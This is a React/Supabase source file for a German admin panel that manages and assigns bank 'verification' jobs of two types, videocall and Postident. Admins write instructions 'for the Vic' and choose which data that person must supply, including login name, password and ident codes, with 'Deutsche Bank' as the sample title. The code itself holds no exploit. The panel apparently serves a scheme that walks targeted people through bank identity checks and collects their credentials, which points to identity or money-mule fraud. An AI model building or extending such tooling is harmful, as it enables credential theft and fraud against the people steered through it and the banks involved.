import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { Plus, Pencil, Trash2, X, UserPlus, ShieldCheck, AlertTriangle, Loader2 } from "lucide-react";
import { DialogShellHeader, DialogSection, DialogFooterBar } from "@/components/admin/DialogShell";
import { useToast } from "@/hooks/use-toast";
import AssignVerificationDialog from "@/components/AssignVerificationDialog";
import AdminAssignmentHistory from "@/components/AdminAssignmentHistory";
import VerificationLogo from "@/components/VerificationLogo";

type VerificationType = "videocall" | "postident";

interface Verification {
  id: string;
  title: string;
  logo_url: string | null;
  instructions: string[];
  required_fields: string[];
  appstore_url: string | null;
  playstore_url: string | null;
  type: VerificationType;
  created_by: string | null;
  created_at: string;
}

const REQUIRED_FIELD_OPTIONS: { value: string; label: string }[] = [
  { value: "identcode", label: "Identcode" },
  { value: "identlink", label: "Identlink" },
  { value: "email", label: "Email" },
  { value: "username", label: "Anmeldename" },
  { value: "password", label: "Passwort" },
  { value: "phone", label: "Telefonnummer" },
];

export default function AdminVerifications() {
  const { user } = useAuth();
  const { toast } = useToast();
  const [verifications, setVerifications] = useState<Verification[]>([]);
  const [loading, setLoading] = useState(true);
  const [dialogOpen, setDialogOpen] = useState(false);
  const [deleteDialogOpen, setDeleteDialogOpen] = useState(false);
  const [editing, setEditing] = useState<Verification | null>(null);
  const [saving, setSaving] = useState(false);

  // Form state
  const [title, setTitle] = useState("");
  const [instructions, setInstructions] = useState<string[]>([""]);
  const [requiredFields, setRequiredFields] = useState<string[]>([]);
  const [appstoreUrl, setAppstoreUrl] = useState("");
  const [playstoreUrl, setPlaystoreUrl] = useState("");
  const [logoFile, setLogoFile] = useState<File | null>(null);
  const [logoPreview, setLogoPreview] = useState<string | null>(null);
  const [type, setType] = useState<VerificationType>("videocall");

  // Assign dialog
  const [assignDialogOpen, setAssignDialogOpen] = useState(false);
  const [assignVerification, setAssignVerification] = useState<Verification | null>(null);
  const [historyRefreshToken, setHistoryRefreshToken] = useState(0);


  useEffect(() => {
    fetchVerifications();
  }, []);

  const fetchVerifications = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("verifications")
      .select("*")
      .order("created_at", { ascending: false });
    if (!error && data) setVerifications(data as Verification[]);
    setLoading(false);
  };

  const resetForm = () => {
    setTitle("");
    setInstructions([""]);
    setRequiredFields([]);
    setAppstoreUrl("");
    setPlaystoreUrl("");
    setLogoFile(null);
    setLogoPreview(null);
    setType("videocall");
    setEditing(null);
  };

  const openCreate = () => {
    resetForm();
    setDialogOpen(true);
  };

  const openEdit = (v: Verification) => {
    setEditing(v);
    setTitle(v.title);
    setInstructions(v.instructions.length > 0 ? v.instructions : [""]);
    setRequiredFields(v.required_fields || []);
    setAppstoreUrl(v.appstore_url || "");
    setPlaystoreUrl(v.playstore_url || "");
    setLogoPreview(v.logo_url);
    setLogoFile(null);
    setType((v.type as VerificationType) || "videocall");
    setDialogOpen(true);
  };

  const uploadLogo = async (): Promise<string | null> => {
    if (!logoFile) return editing?.logo_url ?? null;
    const ext = logoFile.name.split(".").pop();
    const path = `${crypto.randomUUID()}.${ext}`;
    const { error } = await supabase.storage
      .from("verification-logos")
      .upload(path, logoFile);
    if (error) {
      toast({ title: "Logo-Upload fehlgeschlagen", description: error.message, variant: "destructive" });
      return null;
    }
    return path;
  };

  const toggleField = (field: string) => {
    setRequiredFields((prev) =>
      prev.includes(field) ? prev.filter((f) => f !== field) : [...prev, field]
    );
  };

  const handleSave = async () => {
    if (!title.trim()) {
      toast({ title: "Titel ist erforderlich", variant: "destructive" });
      return;
    }
    setSaving(true);
    const logoUrl = await uploadLogo();
    const filteredInstructions = instructions.filter((i) => i.trim() !== "");
    const isPostident = type === "postident";
    const payloadBase = {
      title: title.trim(),
      logo_url: logoUrl,
      instructions: filteredInstructions,
      required_fields: isPostident ? [] : requiredFields,
      appstore_url: isPostident ? null : appstoreUrl.trim() || null,
      playstore_url: isPostident ? null : playstoreUrl.trim() || null,
      type,
    };

    if (editing) {
      const { error } = await supabase
        .from("verifications")
        .update(payloadBase)
        .eq("id", editing.id);
      if (error) {
        toast({ title: "Fehler beim Speichern", description: error.message, variant: "destructive" });
      } else {
        toast({ title: "Verifikation aktualisiert" });
      }
    } else {
      const { error } = await supabase.from("verifications").insert({
        ...payloadBase,
        created_by: user?.id,
      });
      if (error) {
        toast({ title: "Fehler beim Erstellen", description: error.message, variant: "destructive" });
      } else {
        toast({ title: "Verifikation erstellt" });
      }
    }

    setSaving(false);
    setDialogOpen(false);
    resetForm();
    fetchVerifications();
  };

  const handleDelete = async () => {
    if (!editing) return;
    const { error } = await supabase.from("verifications").delete().eq("id", editing.id);
    if (error) {
      toast({ title: "Fehler beim Löschen", description: error.message, variant: "destructive" });
    } else {
      toast({ title: "Verifikation gelöscht" });
    }
    setDeleteDialogOpen(false);
    setDialogOpen(false);
    resetForm();
    fetchVerifications();
  };

  const addInstruction = () => setInstructions([...instructions, ""]);
  const removeInstruction = (idx: number) =>
    setInstructions(instructions.filter((_, i) => i !== idx));
  const updateInstruction = (idx: number, val: string) =>
    setInstructions(instructions.map((v, i) => (i === idx ? val : v)));

  return (
    <div className="space-y-8">
      <div className="flex flex-col gap-4 border-b border-border pb-6 sm:flex-row sm:items-end sm:justify-between">
        <div>
          <p className="mb-2 text-xs font-bold uppercase text-primary" style={{ letterSpacing: "0.08em" }}>Auftragssteuerung</p>
          <h2 className="font-display text-2xl font-semibold">Verifikationen</h2>
          <p className="mt-2 text-sm text-muted-foreground">Auftragstypen verwalten, zuweisen und laufende Vorgänge überwachen.</p>
        </div>
        <Button onClick={openCreate} className="gap-2"><Plus /> Neue Verifikation</Button>
      </div>

      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
        {/* Create Card */}
        {loading
          ? Array.from({ length: 3 }).map((_, i) => (
              <Card key={i} className="border-border/60 bg-card min-h-[180px] animate-pulse" />
            ))
          : verifications.map((v) => (
              <Card key={v.id} className="relative min-h-[172px] group">
                <CardContent className="flex h-full flex-col items-start gap-4 p-5">
                  <VerificationLogo
                    value={v.logo_url}
                    alt={v.title}
                    className="w-12 h-12 rounded-md border border-border object-contain"
                    fallback={<div className="w-12 h-12 rounded-md border border-border bg-muted flex items-center justify-center text-muted-foreground text-[10px] font-semibold">LOGO</div>}
                  />
                  <div className="min-w-0">
                    <span className="block truncate font-display text-sm font-semibold text-foreground">{v.title}</span>
                    <span className={`mt-2 inline-flex rounded-md border px-2 py-0.5 text-[10px] font-bold uppercase ${v.type === "postident" ? "border-warning/25 bg-warning/10 text-warning" : "border-primary/20 bg-primary/10 text-primary"}`}>
                    {v.type === "postident" ? "Postident" : "Videocall"}
                    </span>
                  </div>
                  <Button
                    variant="default"
                    size="sm"
                    className="mt-auto w-full gap-1.5 text-xs"
                    onClick={(e) => {
                      e.stopPropagation();
                      setAssignVerification(v);
                      setAssignDialogOpen(true);
                    }}
                  >
                    <UserPlus className="w-3.5 h-3.5" /> Zuweisen
                  </Button>
                </CardContent>
                {/* Edit button */}
                <div className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity">
                  <Button
                    size="icon"
                    variant="ghost"
                    className="h-8 w-8"
                    onClick={() => openEdit(v)}
                  >
                    <Pencil className="w-4 h-4" />
                  </Button>
                </div>
              </Card>
            ))}
      </div>

      <div>
        <AdminAssignmentHistory refreshToken={historyRefreshToken} />
      </div>

      {/* Create / Edit Dialog */}
      <Dialog open={dialogOpen} onOpenChange={(o) => { if (!o) { setDialogOpen(false); resetForm(); } }}>
        <DialogContent className="sm:max-w-2xl max-h-[90vh] overflow-y-auto p-6 gap-0">
          <DialogHeader className="space-y-0">
            <DialogShellHeader
              icon={<ShieldCheck className="w-5 h-5" />}
              eyebrow={editing ? "Verifikation bearbeiten" : "Neu erstellen"}
              title={<DialogTitle asChild><span>{editing ? title || "Verifikation bearbeiten" : "Neue Verifikation"}</span></DialogTitle>}
              description="Grunddaten, Ident-Typ und die für den Vic erforderlichen Felder festlegen."
            />
          </DialogHeader>

          <div className="space-y-6 py-6">
            <DialogSection label="Typ">
              <div className="inline-flex rounded-md border border-border p-1 bg-muted">
                {(["videocall", "postident"] as VerificationType[]).map((t) => (
                  <button
                    key={t}
                    type="button"
                    onClick={() => setType(t)}
                    className={`px-4 py-1.5 text-sm rounded-sm transition-colors ${
                      type === t
                        ? "bg-primary text-primary-foreground shadow-sm font-semibold"
                        : "text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    {t === "videocall" ? "Videocall" : "Postident"}
                  </button>
                ))}
              </div>
            </DialogSection>

            <DialogSection label="Grunddaten">
              <div className="grid grid-cols-[auto,1fr] gap-4 items-start">
                <div className="flex flex-col items-center gap-2">
                  <div className="w-16 h-16 rounded-md border border-border bg-muted/40 flex items-center justify-center overflow-hidden">
                    {logoFile && logoPreview ? (
                      <img src={logoPreview} alt="Logo" className="w-full h-full object-contain" />
                    ) : logoPreview ? (
                      <VerificationLogo value={logoPreview} alt="Logo" className="w-full h-full object-contain" />
                    ) : (
                      <span className="text-[10px] text-muted-foreground uppercase tracking-wider">Logo</span>
                    )}
                  </div>
                  <Input
                    type="file"
                    accept="image/*"
                    className="text-xs w-40"
                    onChange={(e) => {
                      const f = e.target.files?.[0] ?? null;
                      setLogoFile(f);
                      if (f) setLogoPreview(URL.createObjectURL(f));
                    }}
                  />
                </div>
                <div className="space-y-2">
                  <Label className="text-sm font-medium">Titel</Label>
                  <Input
                    placeholder="z.B. Deutsche Bank"
                    value={title}
                    onChange={(e) => setTitle(e.target.value)}
                  />
                  <p className="text-xs text-muted-foreground">Wird dem Vic im Dashboard angezeigt.</p>
                </div>
              </div>
            </DialogSection>

            <DialogSection label="Anweisungen für den Vic">
              <div className="space-y-2">
                {instructions.map((inst, idx) => (
                  <div key={idx} className="flex gap-2 items-center">
                    <span className="w-6 h-6 rounded-full bg-muted text-xs font-semibold text-muted-foreground flex items-center justify-center shrink-0">
                      {idx + 1}
                    </span>
                    <Input
                      placeholder={`Anweisung ${idx + 1}`}
                      value={inst}
                      onChange={(e) => updateInstruction(idx, e.target.value)}
                    />
                    {instructions.length > 1 && (
                      <Button
                        type="button"
                        size="icon"
                        variant="ghost"
                        className="shrink-0 text-muted-foreground hover:text-destructive"
                        onClick={() => removeInstruction(idx)}
                      >
                        <X className="w-4 h-4" />
                      </Button>
                    )}
                  </div>
                ))}
                <Button type="button" variant="outline" size="sm" onClick={addInstruction} className="gap-1.5">
                  <Plus className="w-4 h-4" /> Anweisung hinzufügen
                </Button>
              </div>
            </DialogSection>

            {type !== "postident" && (
              <>
                <DialogSection label="App-Links">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div className="space-y-1.5">
                      <Label className="text-xs text-muted-foreground">App Store</Label>
                      <Input
                        placeholder="https://apps.apple.com/..."
                        value={appstoreUrl}
                        onChange={(e) => setAppstoreUrl(e.target.value)}
                      />
                    </div>
                    <div className="space-y-1.5">
                      <Label className="text-xs text-muted-foreground">Play Store</Label>
                      <Input
                        placeholder="https://play.google.com/..."
                        value={playstoreUrl}
                        onChange={(e) => setPlaystoreUrl(e.target.value)}
                      />
                    </div>
                  </div>
                </DialogSection>

                <DialogSection label="Erforderliche Ident-Daten" hint={`${requiredFields.length} ausgewählt`}>
                  <div className="grid grid-cols-2 gap-2 p-3 rounded-md border border-border bg-muted/45">
                    {REQUIRED_FIELD_OPTIONS.map((opt) => {
                      const active = requiredFields.includes(opt.value);
                      return (
                        <label
                          key={opt.value}
                          className={`flex items-center gap-2 text-sm cursor-pointer px-3 py-2 rounded-md border transition-colors ${
                            active
                              ? "border-primary/40 bg-primary/5 text-foreground"
                              : "border-transparent hover:bg-card"
                          }`}
                        >
                          <Checkbox
                            checked={active}
                            onCheckedChange={() => toggleField(opt.value)}
                          />
                          <span className="font-medium">{opt.label}</span>
                        </label>
                      );
                    })}
                  </div>
                </DialogSection>
              </>
            )}
          </div>

          <DialogFooterBar className="justify-between">
            {editing ? (
              <Button
                variant="ghost"
                onClick={() => setDeleteDialogOpen(true)}
                disabled={saving}
                className="text-destructive hover:text-destructive hover:bg-destructive/10 gap-1.5"
              >
                <Trash2 className="w-4 h-4" /> Löschen
              </Button>
            ) : <span />}
            <div className="flex gap-2">
              <Button variant="outline" onClick={() => { setDialogOpen(false); resetForm(); }} disabled={saving}>
                Abbrechen
              </Button>
              <Button onClick={handleSave} disabled={saving} className="gap-2 min-w-[120px]">
                {saving ? <><Loader2 className="w-4 h-4 animate-spin" /> Speichert…</> : editing ? "Änderungen sichern" : "Erstellen"}
              </Button>
            </div>
          </DialogFooterBar>
        </DialogContent>
      </Dialog>

      {/* Delete Confirmation */}
      <AlertDialog open={deleteDialogOpen} onOpenChange={setDeleteDialogOpen}>
        <AlertDialogContent className="rounded-xl">
          <AlertDialogHeader>
            <div className="flex items-start gap-4">
              <div className="w-11 h-11 rounded-xl bg-destructive/10 text-destructive flex items-center justify-center ring-1 ring-destructive/20 shrink-0">
                <AlertTriangle className="w-5 h-5" />
              </div>
              <div>
                <AlertDialogTitle className="text-lg">Verifikation löschen?</AlertDialogTitle>
                <AlertDialogDescription className="mt-1">
                  Die Verifikation und alle Referenzen werden entfernt. Diese Aktion kann nicht rückgängig gemacht werden.
                </AlertDialogDescription>
              </div>
            </div>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Abbrechen</AlertDialogCancel>
            <AlertDialogAction onClick={handleDelete} className="bg-destructive text-destructive-foreground hover:bg-destructive/90">
              Endgültig löschen
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Assign Dialog */}
      <AssignVerificationDialog
        open={assignDialogOpen}
        onOpenChange={setAssignDialogOpen}
        verification={assignVerification}
        onAssigned={() => setHistoryRefreshToken((n) => n + 1)}
      />

    </div>
  );
}
